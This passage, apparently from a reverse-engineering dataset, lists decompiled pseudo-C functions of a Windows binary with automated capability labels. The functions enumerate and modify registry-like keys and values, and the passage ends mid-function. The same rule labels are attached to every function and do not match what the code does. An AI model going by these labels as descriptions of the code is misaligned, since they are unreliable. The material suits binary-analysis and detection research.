        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_54h\n\nint32_t __cdecl fcn.000414b0(uint arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_54h;\n    uint var_4ch;\n    int16_t *var_48h;\n    uint var_44h;\n    uint var_3ch;\n    int16_t *var_38h;\n    uint var_34h;\n    uint var_2ch;\n    int16_t *var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = fcn.00041a00(0x800cb8d8, 0x800550d0, &var_ch);\n    if (var_8h != 0) {\ncode_r0x00041749:\n        fcn.000419a0(var_ch);\n        return var_8h;\n    }\n    var_4h = 0;\n    do {\n        if (*(var_ch + var_4h * 4) == 0) goto code_r0x00041736;\n        var_18h = 0;\n        var_1ch = 0;\n        var_14h = 0;\n        var_8h = fcn.00041840(*(var_ch + var_4h * 4), 0x800550e0, &var_10h, &var_18h, &var_24h);\n        if (var_8h == 0) {\n            iVar2 = fcn.00078b82(var_18h, arg_8h);\n            if (iVar2 == 0) {\n                fcn.000357f0(var_18h);\n            }\n            else {\n                var_8h = fcn.00041840(*(var_ch + var_4h * 4), 0x800550f0, &var_10h, &var_1ch, &var_24h);\n                if (var_8h == 0) {\n                    var_28h = arg_ch;\n                    do {\n                        iVar1 = *var_28h;\n                        var_28h = var_28h + 1;\n                    } while (iVar1 != 0);\n                    iVar2 = fcn.00041da0(var_1ch, var_24h, arg_ch, (var_28h - (arg_ch + 1) >> 1) << 1);\n                    if (iVar2 == 0) {\n                        var_38h = arg_ch;\n                        do {\n                            iVar1 = *var_38h;\n                            var_38h = var_38h + 1;\n                        } while (iVar1 != 0);\n                        var_20h = var_24h + 2 + (var_38h - (arg_ch + 1) >> 1) * 2;\n                        var_14h = fcn.000356c0(var_20h);\n                        if (var_14h == 0) {\n                            var_8h = -0x3fffff66;\n                            fcn.000357f0(var_18h);\n                            fcn.000357f0(var_1ch);\n                        }\n                        else {\n                            fcn.00078bfa(var_14h, 0, var_20h);\n                            fcn.00078be8(var_14h, var_1ch, var_24h);\n                            var_48h = arg_ch;\n                            do {\n                                iVar1 = *var_48h;\n                                var_48h = var_48h + 1;\n                            } while (iVar1 != 0);\n                            fcn.00078be8(var_14h + -2 + var_24h, arg_ch, (var_48h - (arg_ch + 1) >> 1) << 1);\n                            var_8h = fcn.000417a0(*(var_ch + var_4h * 4), 0x800550f0, var_14h, var_20h, 7);\n                            fcn.000357f0(var_18h);\n                            fcn.000357f0(var_1ch);\n                            fcn.000357f0(var_14h);\n                        }\n                    }\n                    else {\n                        var_8h = 0;\n                        fcn.000357f0(var_18h);\n                        fcn.000357f0(var_1ch);\n                    }\ncode_r0x00041736:\n                    if (*(var_ch + var_4h * 4) == 0) {\n                        var_8h = -0x3fffffff;\n                    }\n                    goto code_r0x00041749;\n                }\n                fcn.000357f0(var_18h);\n            }\n        }\n        var_4h = var_4h + 1;\n    } while( true );\n}\n",
        "token_count": 1128
    },
    "000417a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000417a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_ch = 0;\n    fcn.000789c0(&var_8h, arg_8h);\n    var_30h = 0x18;\n    var_2ch = 0;\n    var_24h = 0x140;\n    var_28h = &var_8h;\n    var_20h = 0;\n    var_1ch = 0;\n    var_10h = fcn.000789ba(&var_ch, 2, &var_30h);\n    if (var_10h == 0) {\n        fcn.000789c0(&var_18h, arg_ch);\n        var_10h = fcn.000789ae(var_ch, &var_18h, 0, arg_18h, arg_10h, arg_14h);\n        fcn.000789b4(var_ch);\n    }\n    return var_10h;\n}\n",
        "token_count": 315
    },
    "00041840": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00041840(uint arg_8h, uint arg_ch, uint *arg_10h, int32_t *arg_14h, uint *arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    *arg_14h = 0;\n    fcn.000789c0(&var_8h, arg_8h);\n    var_34h = 0x18;\n    var_30h = 0;\n    var_28h = 0x140;\n    var_2ch = &var_8h;\n    var_24h = 0;\n    var_20h = 0;\n    var_14h = fcn.000789ba(&var_ch, 1, &var_34h);\n    if (var_14h == 0) {\n        fcn.000789c0(&var_1ch, arg_ch);\n        var_14h = fcn.00035090(var_ch, &var_1ch, 2, &var_10h);\n        fcn.000789b4(var_ch);\n        if (var_14h == 0) {\n            if (((*(var_10h + 4) == 1) || (*(var_10h + 4) == 7)) || (*(var_10h + 4) == 2)) {\n                iVar1 = fcn.000356c0(*(var_10h + 8) + 2);\n                *arg_14h = iVar1;\n                if (*arg_14h == 0) {\n                    var_14h = -0x3fffff66;\n                }\n                else {\n                    fcn.00078bfa(*arg_14h, 0, *(var_10h + 8) + 2);\n                    fcn.00078be8(*arg_14h, var_10h + 0xc, *(var_10h + 8));\n                    *arg_10h = *(var_10h + 4);\n                    *arg_18h = *(var_10h + 8);\n                }\n            }\n            else {\n                var_14h = -0x3fffffff;\n            }\n        }\n        fcn.000357f0(var_10h);\n    }\n    return var_14h;\n}\n",
        "token_count": 597
    },
    "000419a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000419a0(int32_t arg_8h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h != 0) {\n        for (var_4h = 0; *(arg_8h + var_4h * 4) != 0; var_4h = var_4h + 1) {\n            fcn.000357f0(*(arg_8h + var_4h * 4));\n        }\n        fcn.000357f0(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "00041a00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_6ch\n\nint32_t __cdecl fcn.00041a00(int16_t *arg_8h, int16_t *arg_ch, int32_t *arg_10h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_6ch;\n    uint var_64h;\n    int16_t *var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    uint var_50h;\n    int16_t *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_24h = 0;\n    var_20h = 0;\n    if (arg_8h == NULL) {\n        var_2ch = -0x3fffff11;\n    }\n    else if (arg_10h == NULL) {\n        var_2ch = -0x3fffff0f;\n    }\n    else {\n        *arg_10h = 0;\n        fcn.000789c0(&var_18h, arg_8h);\n        var_44h = 0x18;\n        var_40h = 0;\n        var_38h = 0x140;\n        var_3ch = &var_18h;\n        var_34h = 0;\n        var_30h = 0;\n        var_2ch = fcn.000789ba(&var_24h, 8, &var_44h);\n        if (var_2ch == 0) {\n            var_48h = 0x418;\n            var_8h = fcn.000356c0(0x418);\n            if (var_8h == 0) {\n                var_2ch = -0x3fffffe9;\n            }\n            else {\n                var_10h = 0;\ncode_r0x00041ad4:\n                uVar2 = var_24h;\n                var_2ch = fcn.00078a86();\n                if (var_2ch == -0x3fffffdd) {\n                    fcn.000357f0(var_8h);\n                    var_48h = var_28h;\n                    var_8h = fcn.000356c0(var_28h);\n                    if (var_8h == 0) {\n                        var_2ch = -0x3fffffe9;\n                        goto code_r0x00041d63;\n                    }\n                    uVar2 = var_24h;\n                    var_2ch = fcn.00078a86();\n                }\n                if (var_2ch != -0x7fffffe6) {\n                    if (var_2ch == 0) goto code_r0x00041acb;\n                    goto code_r0x00041d63;\n                }\n                var_1ch = var_10h;\n                var_20h = fcn.000356c0(var_10h * 4 + 4);\n                if (var_20h == 0) {\n                    var_2ch = -0x3fffffe9;\n                    goto code_r0x00041d63;\n                }\n                fcn.00078bfa(var_20h, 0, var_1ch * 4 + 4, uVar2);\n                if (arg_ch == NULL) {\n                    var_5ch = 0;\n                }\n                else {\n                    var_4ch = arg_ch;\n                    do {\n                        iVar1 = *var_4ch;\n                        var_4ch = var_4ch + 1;\n                    } while (iVar1 != 0);\n                    var_5ch = var_4ch - (arg_ch + 1) >> 1;\n                }\n                var_ch = var_5ch;\n                var_60h = arg_8h;\n                do {\n                    iVar1 = *var_60h;\n                    var_60h = var_60h + 1;\n                } while (iVar1 != 0);\n                var_4h = var_60h - (arg_8h + 1) >> 1;\n                var_10h = 0;\n                while( true ) {\n                    var_2ch = fcn.00078a86(var_24h, var_10h, 0, var_8h, var_48h, &var_28h);\n                    if (var_2ch == -0x7fffffe6) {\n                        var_2ch = 0;\n                        goto code_r0x00041d63;\n                    }\n                    if (var_2ch != 0) goto code_r0x00041d63;\n                    *(var_8h + 0x10 + (*(var_8h + 0xc) & 0xfffffffe)) = 0;\n                    uVar2 = fcn.000356c0((*(var_8h + 0xc) + var_ch + var_4h) * 2 + 8);\n                    *(var_20h + var_10h * 4) = uVar2;\n                    if (*(var_20h + var_10h * 4) == 0) break;\n                    if (arg_ch != NULL) {\n                        iVar3 = fcn.000789c6(*(var_20h + var_10h * 4), *(var_8h + 0xc) + var_ch + 4 + var_4h, 0x80055104\n                                             , arg_8h, var_8h + 0x10, arg_ch);\n                        if (-1 < iVar3) goto code_r0x00041c36;\n                        var_2ch = -0x3fffffff;\n                        goto code_r0x00041d63;\n                    }\n                    iVar3 = fcn.000789c6(*(var_20h + var_10h * 4), *(var_8h + 0xc) + var_ch + 4 + var_4h, 0x80051768, \n                                         arg_8h, var_8h + 0x10);\n                    if (iVar3 < 0) {\n                        var_2ch = -0x3fffffff;\n                        goto code_r0x00041d63;\n                    }\ncode_r0x00041c36:\n                    var_10h = var_10h + 1;\n                }\n                var_2ch = -0x3fffffe9;\n            }\ncode_r0x00041d63:\n            if (var_8h != 0) {\n                fcn.000357f0(var_8h);\n            }\n            if (var_2ch == 0) {\n                *arg_10h = var_20h;\n            }\n            else {\n                fcn.000419a0(var_20h);\n            }\n            fcn.000789b4(var_24h);\n        }\n    }\n    return var_2ch;\ncode_r0x00041acb:\n    var_10h = var_10h + 1;\n    goto code_r0x00041ad4;\n}\n",
        "token_count": 1676
    },
    "00041da0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00041da0(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t *var_34h;\n    int32_t *var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_4h;\n    \n    if ((arg_14h == 0) || (arg_ch < arg_14h)) {\n        return NULL;\n    }\n    if (arg_ch != arg_14h) {\n        if (arg_14h == 1) {\n            piVar1 = fcn.00078b7c(arg_8h, *arg_10h, arg_ch);\n            return piVar1;\n        }\n        var_4h = arg_8h;\n        var_ch = (arg_ch - arg_14h) + 1;\n        do {\n            if (var_ch == 0) {\n                return NULL;\n            }\n            if ((*var_4h == *arg_10h) && (*(var_4h + (arg_14h - 1)) == *(arg_10h + (arg_14h - 1)))) {\n                if (arg_14h == 2) {\n                    return var_4h;\n                }\n                var_30h = arg_10h + 1;\n                var_34h = var_4h + 1;\n                for (var_2ch = arg_14h - 2; 3 < var_2ch; var_2ch = var_2ch - 4) {\n                    if (*var_34h != *var_30h) goto code_r0x00041f8e;\n                    var_30h = var_30h + 1;\n                    var_34h = var_34h + 1;\n                }\n                if (var_2ch == 0) {\ncode_r0x00042010:\n                    var_3ch = 0;\n                }\n                else {\ncode_r0x00041f8e:\n                    var_38h = *var_34h - *var_30h;\n                    if (var_38h == 0) {\n                        if (var_2ch == 1) goto code_r0x00042010;\n                        var_38h = *(var_34h + 1) - *(var_30h + 1);\n                        if (var_38h == 0) {\n                            if (var_2ch == 2) goto code_r0x00042010;\n                            var_38h = *(var_34h + 2) - *(var_30h + 2);\n                            if (var_38h == 0) {\n                                if ((var_2ch == 3) || (var_38h = *(var_34h + 3) - *(var_30h + 3),  var_38h == 0))\n                                goto code_r0x00042010;\n                            }\n                        }\n                    }\n                    var_3ch = 1;\n                    if (var_38h < 1) {\n                        var_3ch = -1;\n                    }\n                }\n                if (var_3ch == 0) {\n                    return var_4h;\n                }\n            }\n            var_4h = var_4h + 1;\n            var_ch = var_ch + -1;\n        } while( true );\n    }\n    var_18h = arg_10h;\n    var_1ch = arg_8h;\n    for (var_14h = arg_ch; 3 < var_14h; var_14h = var_14h - 4) {\n        if (*var_1ch != *var_18h) goto code_r0x00041e03;\n        var_18h = var_18h + 1;\n        var_1ch = var_1ch + 1;\n    }\n    if (var_14h == 0) {\ncode_r0x00041e85:\n        var_24h = 0;\n    }\n    else {\ncode_r0x00041e03:\n        var_20h = *var_1ch - *var_18h;\n        if (var_20h == 0) {\n            if (var_14h == 1) goto code_r0x00041e85;\n            var_20h = *(var_1ch + 1) - *(var_18h + 1);\n            if (var_20h == 0) {\n                if (var_14h == 2) goto code_r0x00041e85;\n                var_20h = *(var_1ch + 2) - *(var_18h + 2);\n                if (var_20h == 0) {\n                    if ((var_14h == 3) || (var_20h = *(var_1ch + 3) - *(var_18h + 3),  var_20h == 0))\n                    goto code_r0x00041e85;\n                }\n            }\n        }\n        var_24h = 1;\n        if (var_20h < 1) {\n            var_24h = -1;\n        }\n    }\n    if (var_24h != 0) {\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 1277
    },
    "00042060": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00042060(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h, uint32_t arg_14h)\n\n{\n    char cVar1;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    do {\n        if (arg_ch - arg_14h <= var_8h) {\n            return 0xffffffff;\n        }\n        var_18h = arg_8h + var_8h;\n        cVar1 = (**0x80051214)(var_18h);\n        if (cVar1 == '\\0') {\n            return 0xffffffff;\n        }\n        cVar1 = (**0x80051214)(var_18h + arg_14h);\n        if (cVar1 == '\\0') {\n            return 0xffffffff;\n        }\n        var_14h = arg_10h;\n        for (var_10h = arg_14h; 3 < var_10h; var_10h = var_10h - 4) {\n            if (*var_18h != *var_14h) goto code_r0x00042107;\n            var_14h = var_14h + 1;\n            var_18h = var_18h + 1;\n        }\n        if (var_10h == 0) {\ncode_r0x00042189:\n            var_20h = 0;\n        }\n        else {\ncode_r0x00042107:\n            var_1ch = *var_18h - *var_14h;\n            if (var_1ch == 0) {\n                if (var_10h == 1) goto code_r0x00042189;\n                var_1ch = *(var_18h + 1) - *(var_14h + 1);\n                if (var_1ch == 0) {\n                    if (var_10h == 2) goto code_r0x00042189;\n                    var_1ch = *(var_18h + 2) - *(var_14h + 2);\n                    if (var_1ch == 0) {\n                        if ((var_10h == 3) || (var_1ch = *(var_18h + 3) - *(var_14h + 3),  var_1ch == 0))\n                        goto code_r0x00042189;\n                    }\n                }\n            }\n            var_20h = 1;\n            if (var_1ch < 1) {\n                var_20h = -1;\n            }\n        }\n        if (var_20h == 0) {\n            return var_8h;\n        }\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 679
    },
    "000421d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000421d0(uint *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    int32_t var_c4h;\n    uint var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    int32_t var_a0h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_bch = 0;\n    var_c4h = 0;\n    if ((arg_8h == NULL) || (arg_8h[6] == 0)) {\n        var_c4h = 0x21590065;\n    }\n    else {\n        *arg_10h = 0;\n        *arg_ch = 0;\n        puVar3 = arg_8h;\n        puVar4 = &var_b8h;\n        for (iVar2 = 0x2a; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        uVar1 = *(var_a0h + 0x14);\n        var_c4h = fcn.00042d30();\n        if (var_c4h == 0) {\n            var_c4h = fcn.000428e0();\n            if ((var_c4h == 0) && (var_c4h = fcn.00042f30(arg_8h, 0, &var_130h, &var_4h),  var_c4h == 0)) {\n                *0x800ce880 = fcn.00042060(var_4h, 200, &var_130h, 0x68);\n                if (*0x800ce880 != -1) {\n                    *0x800ce884 = *0x800ce880 + 4;\n                    *0x800ce888 = *0x800ce880 + 5;\n                    *0x800ce88c = *0x800ce880 + 8;\n                }\n                *0x800ce890 = fcn.0003e360(var_4h, 0x100, 0x800830b0);\n                if (*0x800ce890 == -1) {\n                    var_c4h = 0x21590005;\n                }\n                else {\n                    *0x800ce894 = fcn.0003e360(var_4h, 0x100, 0x800830d0);\n                    if (*0x800ce894 == -1) {\n                        var_c4h = 0x21590005;\n                    }\n                    else {\n                        *0x800ce898 = fcn.0003e360(var_4h, 0x100, 0x80083130);\n                        if (*0x800ce898 == -1) {\n                            var_c4h = 0x21590005;\n                        }\n                        else {\n                            *0x800ce89c = fcn.0003e360(var_4h, 0x100, 0x80083110);\n                            if (*0x800ce89c == -1) {\n                                var_c4h = 0x21590005;\n                            }\n                            else {\n                                *0x800ce8a0 = fcn.0003e360(var_4h, 0x100, 0x800830f0);\n                                if (*0x800ce8a0 == -1) {\n                                    var_c4h = 0x21590005;\n                                }\n                                else {\n                                    *0x800ce8a4 = fcn.0003e360(var_4h, 0x100, 0x800832b0);\n                                    if (*0x800ce8a4 == -1) {\n                                        var_c4h = 0x21590005;\n                                    }\n                                    else {\n                                        *0x800ce8a8 = fcn.0003e360(var_4h, 0x100, 0x80083150);\n                                        if (*0x800ce8a8 == -1) {\n                                            var_c4h = 0x21590005;\n                                        }\n                                        else {\n                                            *0x800ce8ac = fcn.0003e360(var_4h, 0x100, 0x80083190);\n                                            if (*0x800ce8ac == -1) {\n                                                var_c4h = 0x21590005;\n                                            }\n                                            else {\n                                                *0x800ce890 = fcn.0003e360(var_4h, 0x100, 0x800830b0);\n                                                if (*0x800ce890 == -1) {\n                                                    var_c4h = 0x21590005;\n                                                }\n                                                else {\n                                                    *0x800ce8b0 = fcn.0003e360(var_4h, 0x100, 0x80083170);\n                                                    if (*0x800ce8b0 == -1) {\n                                                        var_c4h = 0x21590005;\n                                                    }\n                                                    else {\n                                                        *0x800ce8b4 = fcn.0003e360(var_4h, 0x100, 0x80083230);\n                                                        if (*0x800ce8b4 == -1) {\n                                                            var_c4h = 0x21590005;\n                                                        }\n                                                        else {\n                                                            *0x800ce8b8 = fcn.0003e360(var_4h, 0x100, 0x80083250);\n                                                            if (*0x800ce8b8 == -1) {\n                                                                var_c4h = 0x21590005;\n                                                            }\n                                                            else {\n                                                                *0x800ce8bc = fcn.0003e360(var_4h, 0x100, 0x80083210);\n                                                                if (*0x800ce8bc == -1) {\n                                                                    var_c4h = 0x21590005;\n                                                                }\n                                                                else {\n                                                                    *0x800ce8c0 = fcn.0003e360(var_4h, 0x100, 0x80083270\n                                                                                              );\n                                                                    if (*0x800ce8c0 == -1) {\n                                                                        var_c4h = 0x21590005;\n                                                                    }\n                                                                    else {\n                                                                        *0x800ce8c4 = fcn.0003e360(var_4h, 0x100, \n                                                                                                   0x800831d0);\n                                                                        if (*0x800ce8c4 == -1) {\n                                                                            var_c4h = 0x21590005;\n                                                                        }\n                                                                        else {\n                                                                            *0x800ce8c8 = fcn.0003e360(var_4h, 0x100, \n                                                                                                       0x800831f0);\n                                                                            if (*0x800ce8c8 == -1) {\n                                                                                var_c4h = 0x21590005;\n                                                                            }\n                                                                            else {\n                                                                                *0x800ce8cc = fcn.0003e360(var_4h, 0x100\n                                                                                                           , 0x800831b0)\n                                                                                ;\n                                                                                if (*0x800ce8cc == -1) {\n                                                                                    var_c4h = 0x21590005;\n                                                                                }\n                                                                                else {\n                                                                                    *0x800ce8d0 = fcn.0003e360(var_4h, \n                                                            0x100, 0x80083290);\n                                                            if (*0x800ce8d0 == -1) {\n                                                                var_c4h = 0x21590005;\n                                                            }\n                                                            else {\n                                                                var_c4h = fcn.00042800();\n                                                                if (var_c4h != 0) {\n                                                                    return var_c4h;\n                                                                }\n                                                                fcn.0001ae20(2, &var_ch, &var_c0h);\n                                                                var_8h = 0;\n                                                                for (var_bch = var_4h; var_bch != 0;\n                                                                    var_bch = *(var_bch + 4)) {\n                                                                    if (var_bch != var_4h) {\n                                                                        var_8h = var_8h + 1;\n                                                                    }\n                                                                }\n                                                                fcn.0001af70(var_ch, var_c0h);\n                                                                iVar2 = fcn.000356f0(var_8h << 2);\n                                                                *arg_ch = iVar2;\n                                                                if (*arg_ch == 0) {\n                                                                    var_c4h = -0x3fffff66;\n                                                                }\n                                                                else {\n                                                                    fcn.0001ae20(2, &var_ch, &var_c0h);\n                                                                    *arg_10h = 0;\n                                                                    var_bch = var_4h;\n                                                                    while ((var_bch != 0 && (*arg_10h < var_8h))) {\n                                                                        if (var_bch != var_4h) {\n                                                                            *(*arg_ch + *arg_10h * 4) = var_bch;\n                                                                            *arg_10h = *arg_10h + 1;\n                                                                        }\n                                                                        var_bch = *(var_bch + 4);\n                                                                    }\n                                                                    fcn.0001af70(var_ch, var_c0h);\n                                                                }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            if (var_4h != 0) {\n                (**0x800db878)(var_4h);\n            }\n            *(var_a0h + 0x14) = uVar1;\n            puVar3 = &var_b8h;\n            for (iVar2 = 0x2a; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *arg_8h = *puVar3;\n                puVar3 = puVar3 + 1;\n                arg_8h = arg_8h + 1;\n            }\n            fcn.00042830(0x800cb798, 0x800cb728);\n            fcn.00042830(0x800cb870, 0x800cb778);\n        }\n    }\n    return var_c4h;\n}\n",
        "token_count": 2302
    },
    "00042830": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00042830(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_22ch;\n    uint var_228h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    fcn.000789c6(&var_228h, 0x100, 0x80051768, arg_8h, arg_ch);\n    fcn.000789c0(&var_8h, &var_228h);\n    var_20h = 0x18;\n    var_1ch = 0;\n    var_14h = 0x40;\n    var_18h = &var_8h;\n    var_10h = 0;\n    var_ch = 0;\n    uVar1 = fcn.000789ba(&var_24h, 0xf003f, &var_20h);\n    if (uVar1 == 0) {\n        uVar1 = fcn.000789ea(var_24h);\n    }\n    else {\n        uVar1 = -(uVar1 != 0xc0000008) & uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 306
    },
    "000428e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.000428e0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_2e4h;\n    uint var_2dch;\n    uint *var_2d8h;\n    uint var_2d4h;\n    uint var_2cch;\n    uint *var_2c8h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    uint var_2ach;\n    uint var_2a8h;\n    uint var_2a4h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_298h;\n    uint var_294h;\n    int32_t var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_30h;\n    uint var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_2c4h = *0x80055118;\n    var_2c0h = *0x8005511c;\n    var_2bch = *0x80055120;\n    var_18h = *0x80055124;\n    var_14h = *0x80055128;\n    var_10h = *0x8005512c;\n    var_ch._0_1_ = *0x80055130;\n    var_58h = *0x80055134;\n    var_54h = *0x80055138;\n    var_2b8h = *0x8005513c;\n    var_2b4h = *0x80055140;\n    var_2b0h = *0x80055144;\n    var_2ach = *0x80055148;\n    var_2a8h = *0x8005514c;\n    var_2a4h = *0x80055150;\n    puVar3 = 0x80055154;\n    puVar4 = &var_4ch;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    var_278h = *0x80055170;\n    var_274h = *0x80055174;\n    var_270h = *0x80055178;\n    var_26ch = *0x8005517c;\n    var_268h = *0x80055180;\n    var_264h._0_2_ = *0x80055184;\n    var_2a0h = *0x80055188;\n    var_29ch = *0x8005518c;\n    var_298h = *0x80055190;\n    var_294h = *0x80055194;\n    var_28ch = 1;\n    var_5ch = 2;\n    var_50h = 0;\n    var_284h = 2;\n    fcn.000789c6(&var_260h, 0x100, 0x80051768, 0x800cb798, 0x800cb728);\n    fcn.000789c0(&var_8h, &var_260h);\n    var_30h = 0x18;\n    var_2ch = 0;\n    var_24h = 0x40;\n    var_28h = &var_8h;\n    var_20h = 0;\n    var_1ch = 0;\n    var_290h = fcn.00078a9e(&var_288h, 0xf003f, &var_30h, 0, 0, 0, &var_284h);\n    if (var_290h == 0) {\n        fcn.000789c6(&var_260h, 0x100, 0x80055104, 0x800cb798, 0x800cb728, &var_58h);\n        fcn.000789c0(&var_8h, &var_260h);\n        var_30h = 0x18;\n        var_2ch = 0;\n        var_24h = 0x40;\n        var_28h = &var_8h;\n        var_20h = 0;\n        var_1ch = 0;\n        var_290h = fcn.00078a9e(&var_50h, 0xf003f, &var_30h, 0, 0, 0, &var_284h);\n        if (var_290h == 0) {\n            fcn.000789c0(&var_280h, &var_2b8h);\n            